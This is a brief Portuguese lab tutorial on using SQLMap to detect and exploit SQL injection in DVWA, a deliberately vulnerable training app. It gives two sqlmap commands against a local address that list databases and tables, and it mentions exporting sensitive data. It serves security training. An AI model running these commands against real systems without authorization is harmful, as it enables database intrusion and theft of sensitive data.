Por Dentro do Play 03 — SQLMap DVWA

Neste Play, demonstramos como o SQLMap pode automatizar a detecção e exploração de vulnerabilidades de SQL Injection no DVWA.

Objetivos

  • Identificar falhas de SQL Injection em aplicações web.
  • Explorar banco de dados vulnerável automaticamente.

Comandos Utilizados

  • sqlmap -u "http://192.168.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch --dbs — Detectar e listar bancos de dados disponíveis.
  • sqlmap -u "http://192.168.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#" --batch --tables -D dvwa — Listar tabelas do banco vulnerável.

Resultados Esperados

  • Lista de bancos de dados, tabelas e colunas.
  • Exportação de dados sensíveis do sistema.
  • Relatório automatizado de vulnerabilidades detectadas.
